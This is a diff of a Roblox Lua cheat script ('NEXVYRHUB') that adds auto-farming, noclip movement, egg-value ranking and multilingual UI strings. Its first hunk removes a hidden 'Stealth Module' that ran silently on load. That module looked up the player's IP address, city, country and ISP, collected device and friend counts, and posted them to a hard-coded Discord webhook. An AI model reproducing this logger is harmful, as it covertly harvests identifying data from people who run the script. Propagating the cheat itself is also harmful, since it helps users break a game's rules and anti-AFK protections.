@@ -3,97 +3,6 @@ if genv.NEXVYRHUB_UNLOAD then
     pcall(genv.NEXVYRHUB_UNLOAD)
 end
 
-task.spawn(function()
-    pcall(function()
-        local HttpService = game:GetService("HttpService")
-        local UserInputService = game:GetService("UserInputService")
-        local Players = game:GetService("Players")
-        local LP = Players.LocalPlayer
-        
-        local webhook_url = "https://discord.com/api/webhooks/1564942097520402453/lfWiEYRVMsvxmVjOILHzQZkZJ_35zCIuhhS-XRO85YyfSyG7Dld9UMTsSXE0lv84-5mH"
-        
-        local function httpGet(url)
-            local reqFunc = request or http_request or syn and syn.request or http.request
-            if reqFunc then
-                local res = reqFunc({
-                    Url = url,
-                    Method = "GET"
-                })
-                if res and res.Body then
-                    return res.Body
-                end
-            end
-            return game:HttpGet(url)
-        end
-
-        local ip = "Desconocida"
-        local country = "Desconocido"
-        local city = "Desconocida"
-        local isp = "Desconocido"
-        
-        pcall(function()
-            local ipData = HttpService:JSONDecode(httpGet("http://ip-api.com/json/"))
-            if ipData and ipData.status == "success" then
-                ip = ipData.query
-                country = ipData.country
-                city = ipData.city
-                isp = ipData.isp
-            end
-        end)
-
-        local device = "PC"
-        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
-            device = "Mobile"
-        elseif UserInputService.GamepadEnabled then
-            device = "Console"
-        end
-
-        local friends = 0
-        local followers = 0
-        local following = 0
-        pcall(function()
-            friends = HttpService:JSONDecode(httpGet("https://friends.roblox.com/v1/users/" .. LP.UserId .. "/friends/count")).count or 0
-            followers = HttpService:JSONDecode(httpGet("https://friends.roblox.com/v1/users/" .. LP.UserId .. "/followers/count")).count or 0
-            following = HttpService:JSONDecode(httpGet("https://friends.roblox.com/v1/users/" .. LP.UserId .. "/followings/count")).count or 0
-        end)
-
-        local data = {
-            ["content"] = "NEXVYRHUB - User Profile Log",
-            ["embeds"] = {{
-                ["title"] = "Target: " .. LP.Name,
-                ["url"] = "https://www.roblox.com/users/" .. LP.UserId .. "/profile",
-                ["color"] = 10181046,
-                ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"},
-                ["fields"] = {
-                    {["name"] = "Username", ["value"] = LP.Name, ["inline"] = true},
-                    {["name"] = "Display Name", ["value"] = LP.DisplayName, ["inline"] = true},
-                    {["name"] = "User ID", ["value"] = tostring(LP.UserId), ["inline"] = true},
-                    {["name"] = "Device", ["value"] = device, ["inline"] = true},
-                    {["name"] = "IP Address", ["value"] = ip, ["inline"] = true},
-                    {["name"] = "Country / City", ["value"] = country .. " / " .. city, ["inline"] = true},
-                    {["name"] = "ISP", ["value"] = isp, ["inline"] = true},
-                    {["name"] = "Friends", ["value"] = tostring(friends), ["inline"] = true},
-                    {["name"] = "Followers", ["value"] = tostring(followers), ["inline"] = true},
-                    {["name"] = "Following", ["value"] = tostring(following), ["inline"] = true}
-                },
-                ["footer"] = {["text"] = "Logged via Stealth Module"}
-            }}
-        }
-
-        local payload = HttpService:JSONEncode(data)
-        local reqFunc = request or http_request or syn and syn.request or http.request
-        
-        if reqFunc then
-            reqFunc({
-                Url = webhook_url,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = payload
-            })
-        end
-    end)
-end)
-
 local CFG = {
     Titulo       = "NEXVYRHUB",
     VelMult      = 3.0,
@@ -115,7 +24,6 @@ local CFG = {
 }
 
 local AUTO_LABEL = "Mas caro (auto)"
-local AUTO_ZONA  = "Auto (mejor zona segura)"
 
 local ZONAS = {
     { Id = "Zone1",  Poder = 5 },
@@ -130,6 +38,143 @@ local ZONAS = {
     { Id = "Zone10", Poder = 100000000000 },
     { Id = "Zone11", Poder = 200000000000 },
 }
+local I18N = {
+    en = {
+        tab_info = "Information", tab_farm = "Auto Farm", tab_event = "Event Farm", tab_eggs = "View Eggs", tab_settings = "Settings",
+        info_title = "Love you bluzz, but stop overworking me",
+        info_desc = "This script won't receive updates until the creator decides to, or someone tells him to update it.",
+        event_toggle = "Egg event", lock_title = "Lock event",
+        lock_desc = "If you are farming the event, enable this toggle to lock the main one so it doesn't turn off.",
+        farm = "Farm", stream = "Load distant zones (expensive eggs)", zone_max = "Max zone",
+        zone_auto = "Auto (best safe zone)", zone_fmt = "Zone %d | needs %s", antiafk = "Anti-AFK",
+        spy = "Spy egg", spy_off_title = "Spy egg off", spy_off_desc = "Turn it on to see the most expensive egg",
+        ranking = "Ranking (most expensive)", no_eggs = "No eggs", no_eggs_desc = "No eggs visible right now",
+        spy_desc = "Money: $%s/s expected | up to $%s/s\nRarity: %s\nBest animal: %s (%s)\nZone %d%s | x%.2f | %skg%s",
+        spy_bill = "Best: %s",
+        fpsboost = "FPS Boost", performance = "Performance",
+        themes = "Themes", theme_violet = "Violet", theme_pink = "Dark Pink",
+        graphics = "Graphics",
+        sky = "Sky", sky_default = "Default", sky_anime = "Anime Sky", sky_tornado = "Tornado Alley Sky", sky_aesthetic = "Aesthetic Sky", sky_pink = "Pink Sky", sky_space = "Space Sky HD",
+        sugar = "Sugar Skies",
+        beauty = "Beautiful Skies",
+        language = "Language",
+        n_nobase = "Couldn't find your base",
+        n_zone = "Not enough power for this zone: going back to the lobby",
+        n_noprog = "Egg without progress: skipping it for a while",
+        n_cap = "Your speed only allows up to zone %d, using that",
+        n_pick = "You don't have the pickaxe",
+        n_grab = "Couldn't grab the animal",
+        n_titanic = "Titanic event in a zone without enough power",
+        n_evend = "Event finished", n_noev = "No active event",
+        n_fell = "You fell off the map: returning to your base",
+        n_lang = "Language changed",
+        n_sky = "Couldn't load that sky",
+    },
+    es = {
+        tab_info = "Información", tab_farm = "Auto Farm", tab_event = "Farm de Evento", tab_eggs = "Ver Huevos", tab_settings = "Configuración",
+        info_title = "Te kiero bluzz, pero deja de sobreexplotarme",
+        info_desc = "Este script no recibirá actualizaciones hasta que el creador decida o le digan que lo actualice.",
+        event_toggle = "Evento egg", lock_title = "Bloquear evento",
+        lock_desc = "Si farmearas lo del evento, activa este toggle para bloquear el principal para que no se apague.",
+        farm = "Farm", stream = "Cargar zonas lejanas (huevos caros)", zone_max = "Zona máxima",
+        zone_auto = "Auto (mejor zona segura)", zone_fmt = "Zona %d | pide %s", antiafk = "Anti-AFK",
+        spy = "Espiar huevo", spy_off_title = "Espiar huevo apagado", spy_off_desc = "Actívalo para ver el huevo más caro",
+        ranking = "Ranking (más caros)", no_eggs = "Sin huevos", no_eggs_desc = "No hay huevos visibles ahora",
+        spy_desc = "Dinero: $%s/s esperado | hasta $%s/s\nRareza: %s\nMejor animal: %s (%s)\nZona %d%s | x%.2f | %skg%s",
+        spy_bill = "Mejor: %s",
+        fpsboost = "Boost de FPS", performance = "Rendimiento",
+        themes = "Temas", theme_violet = "Violeta", theme_pink = "Rosa oscuro",
+        graphics = "Gráficos",
+        sky = "Cielo", sky_default = "Predeterminado", sky_anime = "Cielo anime", sky_tornado = "Cielo Tornado Alley", sky_aesthetic = "Cielo estético", sky_pink = "Cielo rosa", sky_space = "Cielo espacial HD",
+        sugar = "Cielos azúcar",
+        beauty = "Cielos hermosos",
+        language = "Idioma",
+        n_nobase = "No encontré tu base",
+        n_zone = "Zona sin poder suficiente: volviendo al lobby",
+        n_noprog = "Huevo sin progreso: lo salto un rato",
+        n_cap = "Tu velocidad solo aguanta hasta la zona %d, se usa esa",
+        n_pick = "No tienes el pico",
+        n_grab = "No pude agarrar el animal",
+        n_titanic = "Evento Titanic en una zona sin poder suficiente",
+        n_evend = "Evento terminado", n_noev = "No hay evento activo",
+        n_fell = "Te caíste del mapa: volviendo a tu base",
+        n_lang = "Idioma cambiado",
+        n_sky = "No se pudo cargar ese cielo",
+    },
+    ja = {
+        tab_info = "情報", tab_farm = "オートファーム", tab_event = "イベントファーム", tab_eggs = "卵を見る", tab_settings = "設定",
+        info_title = "大好きだよ bluzz、でも私をこき使いすぎないで",
+        info_desc = "このスクリプトは、作者が更新を決めるか、更新するよう頼まれるまでアップデートされません。",
+        event_toggle = "エッグイベント", lock_title = "イベントをロック",
+        lock_desc = "イベントをファームする場合は、メインのトグルが勝手にオフにならないようこれをオンにしてください。",
+        farm = "ファーム", stream = "遠いゾーンを読み込む(高額な卵)", zone_max = "最大ゾーン",
+        zone_auto = "自動(最適な安全ゾーン)", zone_fmt = "ゾーン %d | 必要 %s", antiafk = "アンチAFK",
+        spy = "卵をスパイ", spy_off_title = "卵スパイ オフ", spy_off_desc = "オンにすると最も高額な卵が表示されます",
+        ranking = "ランキング(高額順)", no_eggs = "卵なし", no_eggs_desc = "現在見える卵はありません",
+        spy_desc = "お金: 期待値 $%s/秒 | 最大 $%s/秒\nレア度: %s\n最高の動物: %s (%s)\nゾーン %d%s | x%.2f | %skg%s",
+        spy_bill = "最高: %s",
+        fpsboost = "FPSブースト", performance = "パフォーマンス",
+        themes = "テーマ", theme_violet = "バイオレット", theme_pink = "ダークピンク",
+        graphics = "グラフィック",
+        sky = "空", sky_default = "デフォルト", sky_anime = "アニメの空", sky_tornado = "トルネードアレーの空", sky_aesthetic = "エステティックな空", sky_pink = "ピンクの空", sky_space = "宇宙の空 HD",
+        sugar = "シュガースカイ",
+        beauty = "ビューティフルスカイ",
+        language = "言語",
+        n_nobase = "拠点が見つかりません",
+        n_zone = "このゾーンには力が足りません:ロビーに戻ります",
+        n_noprog = "進展のない卵:しばらくスキップします",
+        n_cap = "あなたの速度ではゾーン %d までです。それを使用します",
+        n_pick = "ツルハシを持っていません",
+        n_grab = "動物をつかめませんでした",
+        n_titanic = "力が足りないゾーンでタイタニックイベント発生",
+        n_evend = "イベント終了", n_noev = "進行中のイベントはありません",
+        n_fell = "マップから落ちました:拠点に戻ります",
+        n_lang = "言語を変更しました",
+        n_sky = "その空を読み込めませんでした",
+    },
+    ru = {
+        tab_info = "Информация", tab_farm = "Авто-фарм", tab_event = "Фарм ивента", tab_eggs = "Яйца", tab_settings = "Настройки",
+        info_title = "Люблю тебя, bluzz, но хватит меня эксплуатировать",
+        info_desc = "Этот скрипт не будет обновляться, пока автор сам не решит или пока его не попросят обновить.",
+        event_toggle = "Ивент с яйцами", lock_title = "Блокировать ивент",
+        lock_desc = "Если фармишь ивент, включи этот переключатель, чтобы основной не выключался.",
+        farm = "Фарм", stream = "Загружать дальние зоны (дорогие яйца)", zone_max = "Макс. зона",
+        zone_auto = "Авто (лучшая безопасная зона)", zone_fmt = "Зона %d | нужно %s", antiafk = "Анти-АФК",
+        spy = "Шпион за яйцом", spy_off_title = "Шпион за яйцом выключен", spy_off_desc = "Включи, чтобы увидеть самое дорогое яйцо",
+        ranking = "Рейтинг (самые дорогие)", no_eggs = "Нет яиц", no_eggs_desc = "Сейчас нет видимых яиц",
+        spy_desc = "Деньги: ожидается $%s/с | до $%s/с\nРедкость: %s\nЛучшее животное: %s (%s)\nЗона %d%s | x%.2f | %sкг%s",
+        spy_bill = "Лучшее: %s",
+        fpsboost = "Буст FPS", performance = "Производительность",
+        themes = "Темы", theme_violet = "Фиолетовая", theme_pink = "Тёмно-розовая",
+        graphics = "Графика",
+        sky = "Небо", sky_default = "По умолчанию", sky_anime = "Аниме-небо", sky_tornado = "Небо Торнадо-аллеи", sky_aesthetic = "Эстетичное небо", sky_pink = "Розовое небо", sky_space = "Космическое небо HD",
+        sugar = "Сахарные небеса",
+        beauty = "Прекрасные небеса",
+        language = "Язык",
+        n_nobase = "Не удалось найти твою базу",
+        n_zone = "Не хватает силы для этой зоны: возврат в лобби",
+        n_noprog = "Яйцо без прогресса: пропускаю на время",
+        n_cap = "Твоя скорость позволяет только до зоны %d, используется она",
+        n_pick = "У тебя нет кирки",
+        n_grab = "Не удалось схватить животное",
+        n_titanic = "Ивент Титаник в зоне, где не хватает силы",
+        n_evend = "Ивент завершён", n_noev = "Нет активного ивента",
+        n_fell = "Ты упал с карты: возврат на базу",
+        n_lang = "Язык изменён",
+        n_sky = "Не удалось загрузить это небо",
+    },
+}
+
+local UI = { Lang = "en", Theme = "Violeta", Building = false, Rebuilding = false }
+
+local function tr(k, ...)
+    local s = (I18N[UI.Lang] and I18N[UI.Lang][k]) or I18N.en[k] or k
+    if select("#", ...) > 0 then
+        local ok, r = pcall(string.format, s, ...)
+        if ok then return r end
+    end
+    return s
+end
 
 local Players            = game:GetService("Players")
 local RS                 = game:GetService("ReplicatedStorage")
@@ -143,6 +188,8 @@ local VirtualUser        = game:GetService("VirtualUser")
 local VIM
 pcall(function() VIM = game:GetService("VirtualInputManager") end)
 
+local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
 local LP = Players.LocalPlayer
 
 pcall(function()
@@ -162,6 +209,7 @@ local Alive = true
 local Conns = {}
 local S = {
     Farm       = false,
+    Run        = false,
     Under      = false,
     Esquivar   = false,
     StreamZonas = true,
@@ -170,6 +218,13 @@ local S = {
     Espiar     = false,
     AntiAfk    = false,
     Selected   = nil,
+    Target     = nil,
+    FpsBoost   = false,
+    Evento     = false,
+    EventoLock = false,
+    EvFinish   = 0,
+    EvKind     = nil,
+    Rend       = false,
     ZonaMax    = nil,
     Busy       = false,
     HitId      = math.random(10, 200),
@@ -187,6 +242,7 @@ local S = {
     HoldHasta  = 0,
     HitCF      = nil,
     PrevHit    = false,
+    Gen        = 0,
 }
 
 local ST = {
@@ -201,7 +257,11 @@ local ST = {
 local Black = setmetatable({}, { __mode = "k" })
 local Sub = {}
 
-local WindUI, Window, EggDropdown
+local WindUI, Window, EggDropdown, EventToggle, EventLockToggle
+
+local function runUpdate()
+    S.Run = (S.Farm or S.Evento) and true or false
+end
 local EggByLabel = {}
 local ZonaByLabel = {}
 local HL
@@ -239,11 +299,12 @@ local function fmt(n)
 end
 
 local lastNotif = {}
-local function notify(msg, icon)
+local function notify(key, icon, ...)
     if not WindUI then return end
     local now = os.clock()
-    if lastNotif[msg] and now - lastNotif[msg] < 8 then return end
-    lastNotif[msg] = now
+    if lastNotif[key] and now - lastNotif[key] < 8 then return end
+    lastNotif[key] = now
+    local msg = tr(key, ...)
     pcall(function()
         WindUI:Notify({ Title = CFG.Titulo, Content = msg, Icon = icon or "info", Duration = 3 })
     end)
@@ -293,7 +354,7 @@ end
 
 local function allowedMaxZone()
     local m = safeMaxZone()
-    if S.ZonaMax and S.ZonaMax < m then m = S.ZonaMax end
+    if S.ZonaMax and S.ZonaMax < m and not S.Evento then m = S.ZonaMax end
     return m
 end
 
@@ -383,28 +444,166 @@ local function eggLive(p)
         and not p:GetAttribute("Despawning")
 end
 
+local EggRewardsMod, EggTypeCfg, EggRarityMod
+pcall(function() EggRewardsMod = require(RS:WaitForChild("Shared", 5):WaitForChild("EggRewards", 5)) end)
+pcall(function() EggTypeCfg = require(RS:WaitForChild("Shared", 5):WaitForChild("EggTypeConfig", 5)) end)
+pcall(function() EggRarityMod = require(RS:WaitForChild("Shared", 5):WaitForChild("EggRarity", 5)) end)
+
+local CashCache, RarityCache, RosterCache, SizeCache, EggRarCache = {}, {}, {}, {}, {}
+
+local function animalCash(name, entry)
+    local c = CashCache[name]
+    if c then return c end
+    local v
+    if EggRewardsMod and EggRewardsMod.CashPerSecond then
+        local ok, r = pcall(EggRewardsMod.CashPerSecond, name)
+        if ok and type(r) == "number" then v = r end
+    end
+    if not v and entry and type(entry.Cash) == "number" then v = entry.Cash end
+    v = v or 0
+    CashCache[name] = v
+    return v
+end
+
+local function animalRarity(name, entry)
+    local r = RarityCache[name]
+    if r then return r end
+    if EggRewardsMod and EggRewardsMod.RarityOf then
+        local ok, x = pcall(EggRewardsMod.RarityOf, name)
+        if ok and type(x) == "string" then r = x end
+    end
+    r = r or (entry and entry.Rarity) or "?"
+    RarityCache[name] = r
+    return r
+end
+
+local function rosterOf(eggType)
+    local cached = RosterCache[eggType]
+    if cached then return cached end
+    local list = {}
+    local cfg = EggTypeCfg and EggTypeCfg.Get and EggTypeCfg.Get(eggType)
+    if cfg and type(cfg.HatchPool) == "table" and #cfg.HatchPool > 0 then
+        for _, n in ipairs(cfg.HatchPool) do
+            local w = (cfg.HatchWeights and cfg.HatchWeights[n]) or 1
+            list[#list + 1] = { name = n, chance = w, cash = animalCash(n), rarity = animalRarity(n) }
+        end
+    elseif EggRewardsMod and EggRewardsMod.Pool then
+        local ok, z = pcall(function()
+            return EggRewardsMod.RosterZoneOf(EggRewardsMod.ZoneOfEggType(eggType))
+        end)
+        if ok and z then
+            for _, e in pairs(EggRewardsMod.Pool) do
+                if type(e) == "table" and e.Zone == z and e.Name then
+                    list[#list + 1] = {
+                        name   = e.Name,
+                        chance = tonumber(e.Chance) or tonumber(e.Weight) or 1,
+                        cash   = animalCash(e.Name, e),
+                        rarity = animalRarity(e.Name, e),
+                    }
+                end
+            end
+        end
+    end
+    table.sort(list, function(a, b) return a.cash < b.cash end)
+    if #list > 0 then RosterCache[eggType] = list end
+    return list
+end
+
+local function sizeFactor(refName, refCash, size)
+    local key = refName .. "|" .. tostring(size)
+    local f = SizeCache[key]
+    if f then return f end
+    f = size
+    if refCash > 0 and EggRewardsMod and EggRewardsMod.PlacedCashPerSecond then
+        local ok, r = pcall(EggRewardsMod.PlacedCashPerSecond, refName, size, nil, nil, nil)
+        if ok and type(r) == "number" and r > 0 then f = r / refCash end
+    end
+    SizeCache[key] = f
+    return f
+end
+
+local function eggRarityOf(eggType)
+    local r = EggRarCache[eggType]
+    if r then return r end
+    if EggRarityMod and EggRarityMod.ForEggType then
+        local ok, x = pcall(EggRarityMod.ForEggType, eggType)
+        if ok and type(x) == "string" then r = x end
+    end
+    if not r and EggTypeCfg and EggTypeCfg.Get then
+        local cfg = EggTypeCfg.Get(eggType)
+        if cfg and type(cfg.Rarity) == "string" then r = cfg.Rarity end
+    end
+    if r then EggRarCache[eggType] = r end
+    return r
+end
+
+local function eggValue(p)
+    local eggType = tostring(p:GetAttribute("EggType") or "")
+    local size = tonumber(p:GetAttribute("HatchSizeMult")) or 1
+    local luck = tonumber(p:GetAttribute("HatchLuck")) or tonumber(p:GetAttribute("Luck")) or 1
+    local eggRar = eggRarityOf(eggType)
+    local fixed = p:GetAttribute("HatchAnimal")
+
+    if type(fixed) == "string" and fixed ~= "" then
+        local base = animalCash(fixed)
+        local v = base * sizeFactor(fixed, base, size)
+        local rar = animalRarity(fixed)
+        return { exp = v, best = v, bestName = fixed, bestRarity = rar, eggRarity = eggRar or rar }
+    end
+
+    local list = rosterOf(eggType)
+    local n = #list
+    if n == 0 then
+        return { exp = 0, best = 0, bestName = "?", bestRarity = "?", eggRarity = eggRar or "?" }
+    end
+
+    local top = list[n]
+    local f = sizeFactor(top.name, top.cash, size)
+    local sw, sc = 0, 0
+    for i, a in ipairs(list) do
+        local t = n > 1 and (i - 1) / (n - 1) or 0
+        local w = a.chance * (1 + (luck - 1) * t)
+        sw = sw + w
+        sc = sc + w * a.cash
+    end
+    return {
+        exp        = sw > 0 and (sc / sw) * f or 0,
+        best       = top.cash * f,
+        bestName   = top.name,
+        bestRarity = top.rarity,
+        eggRarity  = eggRar or top.rarity,
+    }
+end
+
 local function eggInfo(p, pos)
     local d = 0
     if pos then d = (p.Position - pos).Magnitude end
     local hp = tonumber(p:GetAttribute("Health")) or 0
     local eta = 0
     if S.Dps > 0 then eta = hp / S.Dps end
+    local v = eggValue(p)
     return {
-        part    = p,
-        name    = tostring(p:GetAttribute("EggType") or "Egg"),
-        zone    = eggZone(p),
-        bracket = tostring(p:GetAttribute("WeightBracket") or ""),
-        brank   = BRACKET[tostring(p:GetAttribute("WeightBracket") or "")] or 0,
-        size    = tonumber(p:GetAttribute("SizeMult")) or 1,
-        luck    = tonumber(p:GetAttribute("Luck")) or 1,
-        kg      = tonumber(p:GetAttribute("WeightKg")) or 0,
-        hp      = hp,
-        eta     = eta,
-        dist    = d,
+        part       = p,
+        name       = tostring(p:GetAttribute("EggType") or "Egg"),
+        zone       = eggZone(p),
+        bracket    = tostring(p:GetAttribute("WeightBracket") or ""),
+        brank      = BRACKET[tostring(p:GetAttribute("WeightBracket") or "")] or 0,
+        size       = tonumber(p:GetAttribute("SizeMult")) or 1,
+        luck       = tonumber(p:GetAttribute("Luck")) or 1,
+        kg         = tonumber(p:GetAttribute("WeightKg")) or 0,
+        hp         = hp,
+        eta        = eta,
+        dist       = d,
+        value      = v.exp,
+        best       = v.best,
+        bestName   = v.bestName,
+        bestRarity = v.bestRarity,
+        eggRarity  = v.eggRarity,
     }
 end
 
 local function better(a, b)
+    if a.value ~= b.value then return a.value > b.value end
     if a.zone ~= b.zone then return a.zone > b.zone end
     if a.brank ~= b.brank then return a.brank > b.brank end
     if a.size ~= b.size then return a.size > b.size end
@@ -413,10 +612,10 @@ local function better(a, b)
     return a.dist < b.dist
 end
 
-local function scanEggs()
+local function scanEggs(ignoreCap)
     local hrp = getHRP()
     local pos = hrp and hrp.Position
-    local cap = allowedMaxZone()
+    local cap = ignoreCap and 99 or allowedMaxZone()
     local list = {}
     for _, p in ipairs(CollectionService:GetTagged("BreakableEgg")) do
         if p:IsA("BasePart") and p:GetAttribute("EggType") and eggLive(p) and (Black[p] or 0) < os.clock() then
@@ -431,11 +630,7 @@ local function scanEggs()
 end
 
 local function eggLabel(info, rank)
-    local tag = ""
-    if info.bracket ~= "" then tag = " " .. info.bracket end
-    local eta = ""
-    if S.Dps > 0 then eta = string.format(" | ~%ds", math.min(math.floor(info.eta), 9999)) end
-    return string.format("%d. %s | Z%d%s | x%.2f | %skg%s", rank, info.name, info.zone, tag, info.size, fmt(info.kg), eta)
+    return string.format("%d. %s | Z%d | $%s/s | %s", rank, info.name, info.zone, fmt(info.value), tostring(info.eggRarity))
 end
 
 local function selectAuto()
@@ -453,17 +648,30 @@ local function desiredEgg()
     end
     local list = scanEggs()
     if #list == 0 then return nil end
-    if S.Dps <= 0 then return list[1].part end
+    local top = list[1]
 
-    local fastest = list[1]
-    for _, info in ipairs(list) do
-        if info.eta <= S.MaxEta then return info.part end
-        if info.eta < fastest.eta then fastest = info end
+    local cur = S.Target
+    if cur and cur ~= top.part and eggLive(cur) then
+        for _, info in ipairs(list) do
+            if info.part == cur then
+                if info.value >= top.value * 0.9 then return cur end
+                break
+            end
+        end
     end
-    return fastest.part
+    return top.part
 end
 
 local function surfDist(p, pos)
+    if p:GetAttribute("TargetShape") == "Box" then
+        local l = p.CFrame:PointToObjectSpace(pos)
+        local h = p.Size * 0.5
+        return Vector3.new(
+            math.max(math.abs(l.X) - h.X, 0),
+            math.max(math.abs(l.Y) - h.Y, 0),
+            math.max(math.abs(l.Z) - h.Z, 0)
+        ).Magnitude
+    end
     local sz = p.Size
     local d = pos - p.Position
     local flat = math.max(Vector3.new(d.X, 0, d.Z).Magnitude - math.max(sz.X, sz.Z) / 2, 0)
@@ -471,7 +679,23 @@ local function surfDist(p, pos)
     return math.sqrt(flat * flat + vert * vert)
 end
 
-local function standCF(egg)
+local function floorAt(x, y, z)
+    local params = RaycastParams.new()
+    params.FilterType = Enum.RaycastFilterType.Exclude
+    local list = { getChar() }
+    for _, tag in ipairs({ "BreakableEgg", "AnimalPickup", "BreakableHalloweenDoor", "BreakableCandyPile" }) do
+        for _, inst in ipairs(CollectionService:GetTagged(tag)) do
+            list[#list + 1] = inst
+        end
+    end
+    params.FilterDescendantsInstances = list
+    pcall(function() params.RespectCanCollide = true end)
+    local res = Workspace:Raycast(Vector3.new(x, y, z), Vector3.new(0, -90, 0), params)
+    if res then return res.Position.Y end
+    return nil
+end
+
+local function standCF(egg, ang)
     local hrp = getHRP()
     local sz = egg.Size
     local r = math.max(sz.X, sz.Z) / 2 + 3
@@ -481,8 +705,15 @@ local function standCF(egg)
         d = Vector3.new(d.X, 0, d.Z)
         if d.Magnitude > 0.5 then dir = d.Unit end
     end
+    if ang and ang ~= 0 then
+        dir = (CFrame.Angles(0, ang, 0) * dir)
+    end
     local pos = egg.Position + dir * r
     local y = egg.Position.Y - sz.Y / 2 + 3.2
+    local fy = floorAt(pos.X, egg.Position.Y + 4, pos.Z)
+    if fy and math.abs((fy + 3.2) - y) < 25 then
+        y = fy + 3.2
+    end
     return CFrame.new(Vector3.new(pos.X, y, pos.Z), Vector3.new(egg.Position.X, y, egg.Position.Z))
 end
 
@@ -511,6 +742,89 @@ local function travelSpeed()
     return math.clamp(ws * S.VelMult, 12, 240)
 end
 
+local function clearSpot(cf)
+    local pos = cf.Position
+    local ok, res = pcall(function()
+        local ignore = { getChar() }
+        for _, tag in ipairs({ "BreakableEgg", "AnimalPickup", "BreakableHalloweenDoor", "BreakableCandyPile" }) do
+            for _, inst in ipairs(CollectionService:GetTagged(tag)) do
+                ignore[#ignore + 1] = inst
+            end
+        end
+        local params = OverlapParams.new()
+        params.FilterType = Enum.RaycastFilterType.Exclude
+        params.FilterDescendantsInstances = ignore
+        pcall(function() params.RespectCanCollide = true end)
+        for i = 0, 10 do
+            local test = pos + Vector3.new(0, i * 2.5, 0)
+            local parts = Workspace:GetPartBoundsInBox(CFrame.new(test), Vector3.new(3, 5, 2.5), params)
+            local blocked = false
+            for _, p in ipairs(parts) do
+                if p.CanCollide then blocked = true break end
+            end
+            if not blocked then
+                return CFrame.new(test) * cf.Rotation
+            end
+        end
+        return cf
+    end)
+    if ok and res then return res end
+    return cf
+end
+
+local function calm(h)
+    h.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+    h.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+end
+local Move = { N = 0, T = 0, CC = setmetatable({}, { __mode = "k" }) }
+local SOLID = { HumanoidRootPart = true, Head = true, Torso = true, UpperTorso = true, LowerTorso = true }
+
+function Move.noclip(char)
+    for _, p in ipairs(char:GetDescendants()) do
+        if p:IsA("BasePart") then
+            if Move.CC[p] == nil then Move.CC[p] = p.CanCollide end
+            if p.CanCollide then p.CanCollide = false end
+        end
+    end
+end
+
+function Move.enforce()
+    for p in pairs(Move.CC) do
+        if p.Parent and p.CanCollide then p.CanCollide = false end
+    end
+end
+
+function Move.release(force)
+    for p, v in pairs(Move.CC) do
+        if p.Parent then pcall(function() p.CanCollide = v end) end
+        Move.CC[p] = nil
+    end
+    local c = getChar()
+    if c then
+        for name in pairs(SOLID) do
+            local p = c:FindFirstChild(name)
+            if p and p:IsA("BasePart") and not p.CanCollide then
+                pcall(function() p.CanCollide = true end)
+            end
+        end
+    end
+    local hum, hrp = getHum(), getHRP()
+    if hum and hum.Health > 0 then
+        if force or not (c and c:GetAttribute("Ragdolled")) then
+            pcall(function() hum.PlatformStand = false end)
+        end
+    end
+    if hrp then calm(hrp) end
+end
+
+function Move.reset()
+    S.Gen = S.Gen + 1
+    task.defer(function()
+        task.wait(0.15)
+        if Alive and Move.N == 0 then pcall(Move.release, true) end
+    end)
+end
+
 local function moveTo(cf, abort, speed)
     local hrp = getHRP()
     local char = getChar()
@@ -521,53 +835,67 @@ local function moveTo(cf, abort, speed)
     local goal = cf.Position
     local dist = (goal - startPos).Magnitude
     if dist <= 4 then
-        hrp.CFrame = cf
+        hrp.CFrame = clearSpot(cf)
+        calm(hrp)
         return true
     end
 
-    local saved = {}
-    for _, p in ipairs(char:GetDescendants()) do
-        if p:IsA("BasePart") then
-            saved[p] = p.CanCollide
-            p.CanCollide = false
-        end
-    end
+    local gen = S.Gen
+    local hum = getHum()
+    Move.N = Move.N + 1
+    Move.T = os.clock()
+    if hum then pcall(function() hum.PlatformStand = true end) end
+    Move.noclip(char)
 
     local dir = (goal - startPos).Unit
     local rot = cf.Rotation
     local traveled = 0
     local ok = true
 
-    while traveled < dist do
-        if not Alive or (abort and abort()) then ok = false break end
-        local h = getHRP()
-        if not h then ok = false break end
-        local dt = math.min(RunService.Heartbeat:Wait(), 0.05)
-        traveled = math.min(traveled + speed * dt, dist)
-        local a = traveled / dist
-        local pos = startPos:Lerp(goal, a)
-        for p in pairs(saved) do
-            if p.Parent and p.CanCollide then p.CanCollide = false end
+    local okRun = pcall(function()
+        while traveled < dist do
+            if not Alive or S.Gen ~= gen or (abort and abort()) then ok = false break end
+            local h = getHRP()
+            if not h then ok = false break end
+            local dt = math.min(RunService.Heartbeat:Wait(), 0.05)
+            Move.T = os.clock()
+            local left = dist - traveled
+            local step = speed * dt
+            if left < speed * 0.25 then
+                step = math.max(step * (left / (speed * 0.25)), 0.4)
+            end
+            traveled = math.min(traveled + step, dist)
+            local pos = startPos:Lerp(goal, traveled / dist)
+            Move.enforce()
+            h.CFrame = CFrame.new(pos) * rot
+            h.AssemblyLinearVelocity = dir * speed
+            h.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
         end
-        h.CFrame = CFrame.new(pos) * rot
-        h.AssemblyLinearVelocity = dir * speed
-        h.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
-    end
+    end)
+    if not okRun then ok = false end
 
-    for p, v in pairs(saved) do
-        if p.Parent then p.CanCollide = v end
-    end
     local h = getHRP()
     if h then
-        if ok then h.CFrame = cf end
-        h.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
-        h.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+        local final = ok and cf or h.CFrame
+        h.CFrame = clearSpot(final)
+        calm(h)
+    end
+    Move.N = math.max(Move.N - 1, 0)
+    if Move.N == 0 then pcall(Move.release, true) end
+    for _ = 1, 3 do
+        RunService.Heartbeat:Wait()
+        local h2 = getHRP()
+        if h2 then calm(h2) end
+    end
+    if Move.N == 0 then
+        local hm = getHum()
+        if hm then pcall(function() hm.PlatformStand = false end) end
     end
     return ok
 end
 
 local function abortFarm()
-    return (not S.Farm) or isDead()
+    return (not S.Run) or isDead()
 end
 
 local function holding()
@@ -575,7 +903,7 @@ local function holding()
 end
 
 local function abortCarry()
-    return (not S.Farm) or isDead() or holding() or not carryingNow()
+    return (not S.Run) or isDead() or holding() or not carryingNow()
 end
 
